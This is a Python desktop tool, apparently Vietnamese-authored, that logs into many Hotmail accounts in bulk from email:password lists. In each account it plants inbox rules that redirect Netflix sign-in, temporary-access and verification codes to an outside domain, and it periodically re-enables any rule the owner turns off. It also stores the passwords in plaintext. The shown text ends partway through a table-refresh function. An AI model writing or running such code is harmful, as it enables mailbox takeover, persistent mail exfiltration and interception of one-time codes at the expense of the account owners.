"""
Hotmail Rule Creator + Rule Manager
- Tab Create: tạo Netflix forwarding rules cho nhiều account
- Tab Manage: lưu account vào DB, check trạng thái rules, auto re-enable rule bị tắt
"""

import os
import re
import sys
import json
import urllib.parse
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QColor, QPalette
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout,
    QLabel, QPushButton, QTextEdit, QFrame, QProgressBar, QSpinBox, QLineEdit,
    QFileDialog, QMessageBox, QComboBox, QCheckBox, QTabWidget,
    QTableWidget, QTableWidgetItem, QHeaderView, QAbstractItemView,
)


# ==================== CONFIG ====================
CLIENT_ID = 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59'
REDIRECT_URI = 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D'
SCOPE = 'profile openid offline_access https://outlook.office.com/M365.Access'
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
DEFAULT_REDIRECT_DOMAIN = 'tm.cameyou.shop'
ACCOUNTS_DB = 'accounts.json'


# ==================== ACCOUNT STORE ====================
class AccountStore:
    @staticmethod
    def load():
        if os.path.exists(ACCOUNTS_DB):
            try:
                with open(ACCOUNTS_DB, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception:
                return []
        return []

    @staticmethod
    def save(accounts):
        with open(ACCOUNTS_DB, 'w', encoding='utf-8') as f:
            json.dump(accounts, f, indent=2, ensure_ascii=False)

    @classmethod
    def upsert(cls, email, password, **kwargs):
        data = cls.load()
        for a in data:
            if a['email'].lower() == email.lower():
                a['password'] = password
                a.update(kwargs)
                cls.save(data)
                return
        rec = {'email': email, 'password': password, 'last_check': '',
               'rules_total': 0, 'rules_enabled': 0, 'status': ''}
        rec.update(kwargs)
        data.append(rec)
        cls.save(data)

    @classmethod
    def remove(cls, emails):
        emails = {e.lower() for e in emails}
        data = [a for a in cls.load() if a['email'].lower() not in emails]
        cls.save(data)


# ==================== RULE ENGINE ====================
class RuleEngine:
    @staticmethod
    def login(email, password):
        s = requests.Session()
        s.headers.update({'User-Agent': USER_AGENT})
        auth_url = (
            'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize'
            '?client_info=1&haschrome=1'
            f'&login_hint={urllib.parse.quote(email)}&response_type=code'
            f'&client_id={CLIENT_ID}'
            f'&scope={urllib.parse.quote(SCOPE)}'
            f'&redirect_uri={urllib.parse.quote(REDIRECT_URI)}'
        )
        r = s.get(auth_url, timeout=15)
        url_match = (
            re.search(r'urlPost":"([^"]+)"', r.text)
            or re.search(r"urlPost:'([^']+)'", r.text)
            or re.search(r'(https://login\.live\.com/ppsecure/post\.srf\?[^"\\\']+)', r.text)
        )
        ppft_match = (
            re.search(r'name="PPFT"[^>]*value="([^"]+)"', r.text)
            or re.search(r"name='PPFT'[^>]*value='([^']+)'", r.text)
            or re.search(r'name=\\"PPFT\\".*?value=\\"([^\\]+?)\\"', r.text)
            or re.search(r'"sFT":"([^"]+)"', r.text)
        )
        if not url_match or not ppft_match:
            raise Exception('Không tìm thấy PPFT/urlPost (login page format thay đổi?)')
        url_post = url_match.group(1).replace('\\/', '/')
        ppft = ppft_match.group(1)
        data = (
            f'i13=1&login={urllib.parse.quote(email)}'
            f'&loginfmt={urllib.parse.quote(email)}'
            f'&type=11&LoginOptions=1&passwd={urllib.parse.quote(password)}'
            f'&ps=2&PPFT={urllib.parse.quote(ppft)}'
            f'&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0'
            f'&CookieDisclosure=0&IsFidoSupported=0&i19=9960'
        )
        resp = s.post(url_post, data=data, allow_redirects=False, timeout=15,
                      headers={'Content-Type': 'application/x-www-form-urlencoded',
                               'Origin': 'https://login.live.com', 'Referer': r.url})
        loc = resp.headers.get('Location', '')
        m = re.search(r'code=([^&]+)', loc)
        if not m:
            body = resp.text.lower()
            if 'incorrect' in body or 'wrong' in body:
                raise Exception('Sai mật khẩu')
            if 'verify' in body or 'identity' in body:
                raise Exception('Cần verify (2FA / identity)')
            raise Exception('Không lấy được auth code')
        code = urllib.parse.unquote(m.group(1))
        rt = s.post(
            'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
            data={'client_info': '1', 'client_id': CLIENT_ID, 'redirect_uri': REDIRECT_URI,
                  'grant_type': 'authorization_code', 'code': code, 'scope': SCOPE},
            timeout=20,
        )
        if 'access_token' not in rt.text:
            raise Exception(f'Token exchange fail: {rt.text[:200]}')
        return rt.json()['access_token']

    @staticmethod
    def build_rules(email, redirect_domain, selected):
        local = email.split('@', 1)[0]
        redirect_to = f'netflix-{local}@{redirect_domain}'
        sender = [{'emailAddress': {'name': 'Netflix', 'address': 'info@account.netflix.com'}}]
        redirect = [{'emailAddress': {'name': redirect_to, 'address': redirect_to}}]

        def mk(name, seq, conditions):
            return {
                'displayName': name, 'sequence': seq, 'isEnabled': True,
                'conditions': conditions,
                'actions': {'redirectTo': redirect, 'stopProcessingRules': True},
            }

        rules = {
            'login_en': mk('Login code netflix', 1, {'subjectContains': ['Netflix: Your sign-in code']}),
            'login_vi': mk('Đăng nhập code netflix', 2, {'subjectContains': ['Netflix: Mã đăng nhập của bạn']}),
            'family_en': mk('Login code netflix family/ temporary', 3, {'subjectContains': ['Your Netflix temporary access code', 'family']}),
            'family_vi': mk('Mail hộ gia đình', 4, {'subjectContains': ['Mã truy cập Netflix tạm thời của bạn', 'gia đình', 'tạm thời']}),
            'verify_en': mk('First time verification', 5, {'subjectContains': ['Verification code. Expires in 15 minutes.', 'Verification']}),
            'verify_vi': mk('Xác minh lần đầu', 6, {'subjectContains': ['Mã xác minh. Hết hạn sau 15 phút.', 'Mã xác minh']}),
            'all_netflix': mk('netflix all', 7, {'fromAddresses': sender}),
        }
        return [rules[k] for k in selected if k in rules]

    @staticmethod
    def _outlook_url(path=''):
        return f'https://outlook.office.com/api/v2.0/me/MailFolders/inbox/messagerules{path}'

    @staticmethod
    def _graph_url(path=''):
        return f'https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules{path}'

    @staticmethod
    def _headers(token):
        return {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json',
                'Accept': 'application/json', 'User-Agent': USER_AGENT}

    @staticmethod
    def create_rule(token, rule, method='outlook'):
        if method == 'outlook':
            rest = {'DisplayName': rule['displayName'], 'Sequence': rule['sequence'],
                    'IsEnabled': rule['isEnabled'], 'Conditions': {}, 'Actions': {}}
            if 'fromAddresses' in rule['conditions']:
                rest['Conditions']['SenderContains'] = [x['emailAddress']['address'] for x in rule['conditions']['fromAddresses']]
            if 'subjectContains' in rule['conditions']:
                rest['Conditions']['SubjectContains'] = rule['conditions']['subjectContains']
            ak = 'redirectTo' if 'redirectTo' in rule['actions'] else 'forwardTo'
            rest_ak = 'RedirectTo' if ak == 'redirectTo' else 'ForwardTo'
            rest['Actions'][rest_ak] = [
                {'EmailAddress': {'Address': x['emailAddress']['address'], 'Name': x['emailAddress'].get('name', '')}}
                for x in rule['actions'][ak]
            ]
            rest['Actions']['StopProcessingRules'] = rule['actions'].get('stopProcessingRules', True)
            return requests.post(RuleEngine._outlook_url(), headers=RuleEngine._headers(token), json=rest, timeout=30)
        return requests.post(RuleEngine._graph_url(), headers=RuleEngine._headers(token), json=rule, timeout=30)

    @staticmethod
    def list_rules(token, method='outlook'):
        url = RuleEngine._outlook_url() if method == 'outlook' else RuleEngine._graph_url()
        r = requests.get(url, headers=RuleEngine._headers(token), timeout=20)
        r.raise_for_status()
        return r.json().get('value', [])

    @staticmethod
    def enable_rule(token, rule_id, method='outlook'):
        if method == 'outlook':
            return requests.patch(RuleEngine._outlook_url(f'/{rule_id}'),
                                  headers=RuleEngine._headers(token),
                                  json={'IsEnabled': True}, timeout=20)
        return requests.patch(RuleEngine._graph_url(f'/{rule_id}'),
                              headers=RuleEngine._headers(token),
                              json={'isEnabled': True}, timeout=20)


# ==================== WORKERS ====================
class CreateWorker(QThread):
    log_signal = pyqtSignal(str, str)
    account_done = pyqtSignal(dict)
    progress = pyqtSignal(int, int)
    finished_signal = pyqtSignal()

    def __init__(self, accounts, selected, domain, api, threads):
        super().__init__()
        self.accounts = accounts
        self.selected = selected
        self.domain = domain
        self.api = api
        self.threads = threads
        self.running = True
        self.processed = 0

    def process_one(self, combo):
        if not self.running:
            return
        try:
            email, password = combo.split(':', 1)
            email, password = email.strip(), password.strip()
        except ValueError:
            self.log_signal.emit('ERROR', f'Invalid combo: {combo}')
            return

        result = {'email': email, 'status': 'PENDING', 'rules_ok': 0, 'rules_total': 0, 'error': ''}
        try:
            self.log_signal.emit('INFO', f'[{email}] Đang login...')
            token = RuleEngine.login(email, password)
            self.log_signal.emit('OK', f'[{email}] Login OK')
            rules = RuleEngine.build_rules(email, self.domain, self.selected)
            result['rules_total'] = len(rules)
            for rule in rules:
                if not self.running:
                    break
                r = RuleEngine.create_rule(token, rule, self.api)
                if r.status_code < 400:
                    result['rules_ok'] += 1
                    self.log_signal.emit('OK', f'[{email}] Rule OK: {rule["displayName"]} [{r.status_code}]')
                else:
                    self.log_signal.emit('ERROR', f'[{email}] Rule fail: {rule["displayName"]} [{r.status_code}] {r.text[:120]}')
            if result['rules_ok'] == result['rules_total'] and result['rules_total'] > 0:
                result['status'] = 'SUCCESS'
            elif result['rules_ok'] > 0:
                result['status'] = 'PARTIAL'
            else:
                result['status'] = 'FAILED'
            # Auto-save vào DB nếu thành công
            if result['rules_ok'] > 0:
                AccountStore.upsert(email, password,
                    last_check=datetime.now().strftime('%Y-%m-%d %H:%M'),
                    rules_total=result['rules_ok'], rules_enabled=result['rules_ok'],
                    status='OK')
        except Exception as e:
            result['status'] = 'LOGIN_FAILED'
            result['error'] = str(e)
            self.log_signal.emit('ERROR', f'[{email}] {e}')

        self.processed += 1
        self.account_done.emit(result)
        self.progress.emit(self.processed, len(self.accounts))

    def run(self):
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(self.process_one, self.accounts))
        self.finished_signal.emit()

    def stop(self):
        self.running = False


class CheckWorker(QThread):
    log_signal = pyqtSignal(str, str)
    account_checked = pyqtSignal(dict)
    progress = pyqtSignal(int, int)
    finished_signal = pyqtSignal()

    def __init__(self, accounts, auto_enable, api, threads):
        super().__init__()
        self.accounts = accounts  # list of dict {email, password, ...}
        self.auto_enable = auto_enable
        self.api = api
        self.threads = threads
        self.running = True
        self.processed = 0

    def check_one(self, account):
        if not self.running:
            return
        email = account['email']
        password = account['password']
        result = {'email': email, 'status': '', 'rules_total': 0,
                  'rules_enabled': 0, 'rules_disabled': 0, 'fixed': 0,
                  'last_check': datetime.now().strftime('%Y-%m-%d %H:%M'), 'error': ''}
        try:
            self.log_signal.emit('INFO', f'[{email}] Login...')
            token = RuleEngine.login(email, password)
            rules = RuleEngine.list_rules(token, self.api)
            result['rules_total'] = len(rules)
            disabled = []
            for r in rules:
                enabled = r.get('IsEnabled', r.get('isEnabled', True))
                if enabled:
                    result['rules_enabled'] += 1
                else:
                    result['rules_disabled'] += 1
                    disabled.append((r.get('Id', r.get('id')), r.get('DisplayName', r.get('displayName', '?'))))

            if disabled:
                self.log_signal.emit('WARN', f'[{email}] {len(disabled)} rule bị tắt: {", ".join(n for _, n in disabled)}')
                if self.auto_enable:
                    for rid, name in disabled:
                        if not self.running:
                            break
                        rp = RuleEngine.enable_rule(token, rid, self.api)
                        if rp.status_code < 400:
                            result['fixed'] += 1
                            self.log_signal.emit('OK', f'[{email}] Bật lại: {name}')
                        else:
                            self.log_signal.emit('ERROR', f'[{email}] Bật fail: {name} [{rp.status_code}]')

            if result['rules_total'] == 0:
                result['status'] = 'NO_RULES'
            elif result['rules_disabled'] == 0:
                result['status'] = 'OK'
            elif result['fixed'] == result['rules_disabled']:
                result['status'] = 'FIXED'
            else:
                result['status'] = 'DISABLED'

            AccountStore.upsert(email, password,
                last_check=result['last_check'],
                rules_total=result['rules_total'],
                rules_enabled=result['rules_enabled'] + result['fixed'],
                status=result['status'])
        except Exception as e:
            result['status'] = 'LOGIN_FAILED'
            result['error'] = str(e)
            self.log_signal.emit('ERROR', f'[{email}] {e}')
            AccountStore.upsert(email, password,
                last_check=result['last_check'], status='LOGIN_FAILED')

        self.processed += 1
        self.account_checked.emit(result)
        self.progress.emit(self.processed, len(self.accounts))

    def run(self):
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(self.check_one, self.accounts))
        self.finished_signal.emit()

    def stop(self):
        self.running = False


# ==================== MAIN WINDOW ====================
class MainWindow(QMainWindow):
    C = {
        'bg': '#0f1419', 'panel': '#1a1f2e', 'panel_dark': '#0d1117',
        'border': '#2a3142', 'accent': '#e50914', 'accent_hover': '#b20710',
        'success': '#10b981', 'warning': '#f59e0b', 'danger': '#ef4444',
        'text': '#e6edf3', 'text_dim': '#7d8590', 'info': '#3b82f6',
    }

    def __init__(self):
        super().__init__()
        self.setWindowTitle('Hotmail Rule Creator + Manager')
        self.resize(1400, 820)
        self.setMinimumSize(1100, 650)
        self.create_worker = None
        self.check_worker = None
        self.create_results = []
        self.create_stats = {'total': 0, 'success': 0, 'partial': 0, 'failed': 0, 'login_failed': 0}
        self.auto_check_timer = QTimer()
        self.auto_check_timer.timeout.connect(self.auto_check_tick)
        self.init_ui()
        self.refresh_table()

    def init_ui(self):
        c = self.C
        self.setStyleSheet(f"""
            QMainWindow {{ background:{c['bg']}; }}
            QWidget {{ color:{c['text']}; font-family:'Segoe UI'; font-size:12px; }}
            QFrame#card {{ background:{c['panel']}; border:1px solid {c['border']}; border-radius:8px; }}
            QLabel#title {{ font-size:22px; font-weight:bold; color:{c['accent']}; }}
            QLabel#section {{ font-size:10px; font-weight:bold; color:{c['text_dim']}; letter-spacing:1px; }}
            QPushButton {{ background:{c['accent']}; color:white; border:0; border-radius:6px; padding:9px 16px; font-weight:bold; }}
            QPushButton:hover {{ background:{c['accent_hover']}; }}
            QPushButton:disabled {{ background:{c['border']}; color:{c['text_dim']}; }}
            QPushButton#secondary {{ background:transparent; border:1px solid {c['border']}; color:{c['text']}; }}
            QPushButton#secondary:hover {{ background:{c['panel_dark']}; }}
            QPushButton#stop {{ background:{c['danger']}; }}
            QPushButton#success {{ background:{c['success']}; }}
            QTextEdit, QLineEdit {{ background:{c['panel_dark']}; border:1px solid {c['border']}; border-radius:6px; padding:7px; color:{c['text']}; font-family:Consolas; selection-background-color:{c['accent']}; }}
            QTextEdit:focus, QLineEdit:focus {{ border:1px solid {c['accent']}; }}
            QSpinBox, QComboBox {{ background:{c['panel_dark']}; border:1px solid {c['border']}; border-radius:5px; padding:5px; color:{c['text']}; min-width:60px; }}
            QComboBox QAbstractItemView {{ background:{c['panel_dark']}; color:{c['text']}; selection-background-color:{c['accent']}; }}
            QCheckBox {{ spacing:7px; }}
            QCheckBox::indicator {{ width:16px; height:16px; border-radius:4px; border:1px solid {c['border']}; background:{c['panel_dark']}; }}
            QCheckBox::indicator:checked {{ background:{c['accent']}; border:1px solid {c['accent']}; }}
            QProgressBar {{ background:{c['panel_dark']}; border:1px solid {c['border']}; border-radius:6px; height:10px; text-align:center; }}
            QProgressBar::chunk {{ background:{c['accent']}; border-radius:5px; }}
            QTabWidget::pane {{ border:1px solid {c['border']}; border-radius:6px; background:{c['panel']}; }}
            QTabBar::tab {{ background:{c['panel_dark']}; padding:9px 22px; border:1px solid {c['border']}; border-bottom:0; border-top-left-radius:6px; border-top-right-radius:6px; color:{c['text_dim']}; font-weight:bold; }}
            QTabBar::tab:selected {{ background:{c['accent']}; color:white; }}
            QTableWidget {{ background:{c['panel_dark']}; gridline-color:{c['border']}; border:1px solid {c['border']}; border-radius:6px; }}
            QTableWidget::item {{ padding:6px; }}
            QTableWidget::item:selected {{ background:{c['accent']}; color:white; }}
            QHeaderView::section {{ background:{c['panel']}; color:{c['text_dim']}; padding:8px; border:0; border-bottom:1px solid {c['border']}; font-weight:bold; }}
            QScrollBar:vertical {{ background:{c['panel_dark']}; width:10px; border-radius:5px; }}
            QScrollBar::handle:vertical {{ background:{c['border']}; border-radius:5px; min-height:20px; }}
            QScrollBar::add-line, QScrollBar::sub-line {{ height:0; }}
        """)

        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(14, 14, 14, 14)
        root.setSpacing(10)

        # Header
        header = QFrame(objectName='card')
        h = QHBoxLayout(header)
        h.setContentsMargins(20, 13, 20, 13)
        h.addWidget(QLabel('🔥 HOTMAIL RULE CREATOR + MANAGER', objectName='title'))
        h.addStretch()
        self.status_indicator = QLabel('● READY')
        self.status_indicator.setStyleSheet(f"color:{c['success']}; font-weight:bold;")
        h.addWidget(self.status_indicator)
        root.addWidget(header)

        # Tabs
        self.tabs = QTabWidget()
        self.tabs.addTab(self.build_create_tab(), '⚡ Create Rules')
        self.tabs.addTab(self.build_manage_tab(), '📋 Manage / Check')
        root.addWidget(self.tabs, 1)

        self.log('INFO', 'App ready.')

    # ============ TAB 1: CREATE ============
    def build_create_tab(self):
        c = self.C
        w = QWidget()
        body = QHBoxLayout(w)
        body.setSpacing(10)

        left = QVBoxLayout()
        body.addLayout(left, 7)

        # Stats
        stats_card = QFrame(objectName='card')
        sl = QVBoxLayout(stats_card)
        sl.setContentsMargins(14, 10, 14, 10)
        sl.addWidget(QLabel('STATISTICS', objectName='section'))
        grid = QGridLayout()
        grid.setSpacing(8)
        self.create_stat_widgets = {}
        for i, (key, label, color) in enumerate([
            ('total', 'TOTAL', c['text']), ('success', 'SUCCESS', c['success']),
            ('partial', 'PARTIAL', c['warning']), ('failed', 'FAILED', c['danger']),
            ('login_failed', 'LOGIN ERR', c['text_dim']),
        ]):
            box = QFrame(objectName='card')
            bl = QVBoxLayout(box)
            bl.setContentsMargins(8, 6, 8, 6)
            bl.setSpacing(2)
            lab = QLabel(label)
            lab.setAlignment(Qt.AlignCenter)
            lab.setStyleSheet(f'color:{c["text_dim"]}; font-size:9px; font-weight:bold;')
            val = QLabel('0')
            val.setAlignment(Qt.AlignCenter)
            val.setStyleSheet(f'font-size:22px; font-weight:bold; color:{color};')
            bl.addWidget(lab)
            bl.addWidget(val)
            self.create_stat_widgets[key] = val
            grid.addWidget(box, 0, i)
        sl.addLayout(grid)
        left.addWidget(stats_card)

        # Progress
        prog_card = QFrame(objectName='card')
        pl = QVBoxLayout(prog_card)
        pl.setContentsMargins(14, 10, 14, 10)
        pl.addWidget(QLabel('PROGRESS', objectName='section'))
        ph = QHBoxLayout()
        self.create_progress_label = QLabel('0 / 0')
        ph.addWidget(self.create_progress_label)
        ph.addStretch()
        self.create_progress_pct = QLabel('0%')
        self.create_progress_pct.setStyleSheet(f'font-size:14px; font-weight:bold; color:{c["accent"]};')
        ph.addWidget(self.create_progress_pct)
        pl.addLayout(ph)
        self.create_progress_bar = QProgressBar()
        self.create_progress_bar.setTextVisible(False)
        pl.addWidget(self.create_progress_bar)
        left.addWidget(prog_card)

        # Log
        log_card = QFrame(objectName='card')
        ll = QVBoxLayout(log_card)
        ll.setContentsMargins(14, 10, 14, 10)
        ll.addWidget(QLabel('LIVE LOG', objectName='section'))
        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        ll.addWidget(self.log_view)
        left.addWidget(log_card, 1)

        right = QVBoxLayout()
        body.addLayout(right, 3)

        # Input
        in_card = QFrame(objectName='card')
        il = QVBoxLayout(in_card)
        il.setContentsMargins(14, 10, 14, 10)
        il.addWidget(QLabel('ACCOUNTS', objectName='section'))
        il.addWidget(QLabel('email:password hoặc email|password (mỗi dòng)'))
        self.accounts_input = QTextEdit()
        self.accounts_input.setPlaceholderText('email1@hotmail.com:password1\nemail2@hotmail.com|password2')
        self.accounts_input.setMinimumHeight(110)
        il.addWidget(self.accounts_input)
        load_btn = QPushButton('📁 Load File')
        load_btn.setObjectName('secondary')
        load_btn.clicked.connect(self.load_file)
        il.addWidget(load_btn)
        right.addWidget(in_card)

        # Settings
        set_card = QFrame(objectName='card')
        sel = QVBoxLayout(set_card)
        sel.setContentsMargins(14, 10, 14, 10)
        sel.addWidget(QLabel('SETTINGS', objectName='section'))
        sel.addWidget(QLabel('Forward Domain'))
        self.domain_input = QLineEdit(DEFAULT_REDIRECT_DOMAIN)
        sel.addWidget(self.domain_input)
        sel.addWidget(QLabel('API Method'))
        self.api_combo = QComboBox()
        self.api_combo.addItems(['Outlook REST v2.0', 'Microsoft Graph'])
        sel.addWidget(self.api_combo)
        thr = QHBoxLayout()
        thr.addWidget(QLabel('Threads'))
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 50)
        self.thread_spin.setValue(3)
        thr.addWidget(self.thread_spin)
        thr.addStretch()
        sel.addLayout(thr)
        sel.addWidget(QLabel('Rules:'))
        self.cb_login_en = QCheckBox('Login code (EN)'); self.cb_login_en.setChecked(True)
        self.cb_login_vi = QCheckBox('Login code (VI)'); self.cb_login_vi.setChecked(True)
        self.cb_family_en = QCheckBox('Family/Temp (EN)'); self.cb_family_en.setChecked(True)
        self.cb_family_vi = QCheckBox('Hộ gia đình (VI)'); self.cb_family_vi.setChecked(True)
        self.cb_verify_en = QCheckBox('Verification (EN)'); self.cb_verify_en.setChecked(True)
        self.cb_verify_vi = QCheckBox('Xác minh (VI)'); self.cb_verify_vi.setChecked(True)
        self.cb_all = QCheckBox('All Netflix emails'); self.cb_all.setChecked(False)
        for cb in (self.cb_login_en, self.cb_login_vi, self.cb_family_en,
                   self.cb_family_vi, self.cb_verify_en, self.cb_verify_vi, self.cb_all):
            sel.addWidget(cb)
        right.addWidget(set_card)

        # Actions
        act_card = QFrame(objectName='card')
        al = QVBoxLayout(act_card)
        al.setContentsMargins(14, 10, 14, 10)
        self.start_btn = QPushButton('▶ START')
        self.start_btn.clicked.connect(self.start_create)
        al.addWidget(self.start_btn)
        self.stop_btn = QPushButton('⏸ STOP')
        self.stop_btn.setObjectName('stop')
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_create)
        al.addWidget(self.stop_btn)
        right.addWidget(act_card)
        right.addStretch()

        return w

    # ============ TAB 2: MANAGE ============
    def build_manage_tab(self):
        c = self.C
        w = QWidget()
        layout = QVBoxLayout(w)
        layout.setSpacing(10)

        # Top bar - actions
        top = QFrame(objectName='card')
        tl = QHBoxLayout(top)
        tl.setContentsMargins(14, 10, 14, 10)
        tl.addWidget(QLabel('DATABASE', objectName='section'))
        tl.addStretch()

        self.lbl_db_count = QLabel('0 accounts')
        self.lbl_db_count.setStyleSheet(f'color:{c["text_dim"]};')
        tl.addWidget(self.lbl_db_count)
        tl.addSpacing(15)

        self.cb_auto_enable = QCheckBox('Auto re-enable rule bị tắt')
        self.cb_auto_enable.setChecked(True)
        tl.addWidget(self.cb_auto_enable)
        tl.addSpacing(10)

        tl.addWidget(QLabel('Threads'))
        self.check_thread_spin = QSpinBox()
        self.check_thread_spin.setRange(1, 50)
        self.check_thread_spin.setValue(5)
        tl.addWidget(self.check_thread_spin)
        tl.addSpacing(10)

        self.cb_auto_check = QCheckBox('Auto check mỗi')
        tl.addWidget(self.cb_auto_check)
        self.auto_interval = QSpinBox()
        self.auto_interval.setRange(1, 1440)
        self.auto_interval.setValue(60)
        self.auto_interval.setSuffix(' phút')
        tl.addWidget(self.auto_interval)
        self.cb_auto_check.toggled.connect(self.toggle_auto_check)

        layout.addWidget(top)

        # Buttons
        btn_card = QFrame(objectName='card')
        bl = QHBoxLayout(btn_card)
        bl.setContentsMargins(14, 10, 14, 10)
        self.btn_check_all = QPushButton('🔍 CHECK ALL')
        self.btn_check_all.clicked.connect(self.check_all)
        bl.addWidget(self.btn_check_all)
        self.btn_check_selected = QPushButton('🔍 CHECK SELECTED')
        self.btn_check_selected.setObjectName('secondary')
        self.btn_check_selected.clicked.connect(self.check_selected)
        bl.addWidget(self.btn_check_selected)
        self.btn_stop_check = QPushButton('⏸ STOP')
        self.btn_stop_check.setObjectName('stop')
        self.btn_stop_check.setEnabled(False)
        self.btn_stop_check.clicked.connect(self.stop_check)
        bl.addWidget(self.btn_stop_check)
        bl.addSpacing(20)
        self.btn_add = QPushButton('➕ ADD')
        self.btn_add.setObjectName('secondary')
        self.btn_add.clicked.connect(self.add_account_dialog)
        bl.addWidget(self.btn_add)
        self.btn_import = QPushButton('📥 IMPORT')
        self.btn_import.setObjectName('secondary')
        self.btn_import.clicked.connect(self.import_db)
        bl.addWidget(self.btn_import)
        self.btn_delete = QPushButton('🗑 DELETE SELECTED')
        self.btn_delete.setObjectName('secondary')
        self.btn_delete.clicked.connect(self.delete_selected)
        bl.addWidget(self.btn_delete)
        self.btn_refresh = QPushButton('🔄 REFRESH')
        self.btn_refresh.setObjectName('secondary')
        self.btn_refresh.clicked.connect(self.refresh_table)
        bl.addWidget(self.btn_refresh)
        bl.addStretch()
        layout.addWidget(btn_card)

        # Progress for check
        cprog = QFrame(objectName='card')
        cpl = QHBoxLayout(cprog)
        cpl.setContentsMargins(14, 8, 14, 8)
        cpl.addWidget(QLabel('Check progress:'))
        self.check_progress_bar = QProgressBar()
        self.check_progress_bar.setTextVisible(False)
        cpl.addWidget(self.check_progress_bar, 1)
        self.check_progress_label = QLabel('0 / 0')
        cpl.addWidget(self.check_progress_label)
        layout.addWidget(cprog)

        # Table
        self.table = QTableWidget()
        self.table.setColumnCount(7)
        self.table.setHorizontalHeaderLabels(['Email', 'Password', 'Status', 'Rules', 'Last Check', 'Actions', ''])
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.setAlternatingRowColors(False)
        self.table.verticalHeader().setVisible(False)
        hh = self.table.horizontalHeader()
        hh.setSectionResizeMode(0, QHeaderView.Stretch)
        hh.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        hh.setSectionResizeMode(2, QHeaderView.ResizeToContents)
        hh.setSectionResizeMode(3, QHeaderView.ResizeToContents)
        hh.setSectionResizeMode(4, QHeaderView.ResizeToContents)
        hh.setSectionResizeMode(5, QHeaderView.ResizeToContents)
        hh.setSectionResizeMode(6, QHeaderView.ResizeToContents)
        layout.addWidget(self.table, 1)

        # Check log
        self.check_log = QTextEdit()
        self.check_log.setReadOnly(True)
        self.check_log.setMaximumHeight(140)
        layout.addWidget(self.check_log)

        return w

    # ============ ACTIONS - CREATE ============
    def load_file(self):
        path, _ = QFileDialog.getOpenFileName(self, 'Open file', '', 'Text (*.txt);;All (*.*)')
        if path:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.accounts_input.setPlainText(f.read())

    def selected_create_rules(self):
        out = []
        mp = [
            (self.cb_login_en, 'login_en'), (self.cb_login_vi, 'login_vi'),
            (self.cb_family_en, 'family_en'), (self.cb_family_vi, 'family_vi'),
            (self.cb_verify_en, 'verify_en'), (self.cb_verify_vi, 'verify_vi'),
            (self.cb_all, 'all_netflix'),
        ]
        for cb, k in mp:
            if cb.isChecked():
                out.append(k)
        return out

    def parse_accounts(self):
        out = []
        for line in self.accounts_input.toPlainText().splitlines():
            line = line.strip()
            if not line:
                continue
            if '|' in line and ':' not in line.split('|', 1)[0]:
                line = line.replace('|', ':', 1)
            if ':' in line:
                out.append(line)
        return out

    def start_create(self):
        accs = self.parse_accounts()
        if not accs:
            QMessageBox.warning(self, 'No accounts', 'Nhập account dạng email:password')
            return
        rules = self.selected_create_rules()
        if not rules:
            QMessageBox.warning(self, 'No rules', 'Chọn ít nhất 1 rule')
            return
        api = 'outlook' if self.api_combo.currentIndex() == 0 else 'graph'
        self.create_results = []
        self.create_stats = {'total': len(accs), 'success': 0, 'partial': 0, 'failed': 0, 'login_failed': 0}
        self.update_create_stats()
        self.log_view.clear()
        self.create_progress_bar.setValue(0)
        self.create_progress_pct.setText('0%')
        self.create_progress_label.setText(f'0 / {len(accs)}')
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_indicator.setText('● RUNNING')
        self.status_indicator.setStyleSheet(f"color:{self.C['warning']}; font-weight:bold;")
        domain = self.domain_input.text().strip() or DEFAULT_REDIRECT_DOMAIN
        self.create_worker = CreateWorker(accs, rules, domain, api, self.thread_spin.value())
        self.create_worker.log_signal.connect(self.log)
        self.create_worker.account_done.connect(self.on_create_done)
        self.create_worker.progress.connect(self.on_create_progress)
        self.create_worker.finished_signal.connect(self.on_create_finished)
        self.create_worker.start()

    def stop_create(self):
        if self.create_worker:
            self.create_worker.stop()

    def on_create_done(self, result):
        self.create_results.append(result)
        s = result['status']
        key = {'SUCCESS': 'success', 'PARTIAL': 'partial', 'FAILED': 'failed'}.get(s, 'login_failed')
        self.create_stats[key] += 1
        self.update_create_stats()

    def on_create_progress(self, done, total):
        pct = int(done / total * 100) if total else 0
        self.create_progress_bar.setValue(pct)
        self.create_progress_pct.setText(f'{pct}%')
        self.create_progress_label.setText(f'{done} / {total}')

    def on_create_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_indicator.setText('● DONE')
        self.status_indicator.setStyleSheet(f"color:{self.C['success']}; font-weight:bold;")
        self.log('INFO', f'Hoàn tất. Success={self.create_stats["success"]} Partial={self.create_stats["partial"]} Failed={self.create_stats["failed"]} LoginErr={self.create_stats["login_failed"]}')
        self.refresh_table()

    def update_create_stats(self):
        for k, w in self.create_stat_widgets.items():
            w.setText(str(self.create_stats.get(k, 0)))

    # ============ ACTIONS - MANAGE ============
    def refresh_table(self):
        accounts = AccountStore.load()
        self.lbl_db_count.setText(f'{len(accounts)} accounts')
        self.table.setRowCount(len(accounts))
        for i, a in enumerate(accounts):
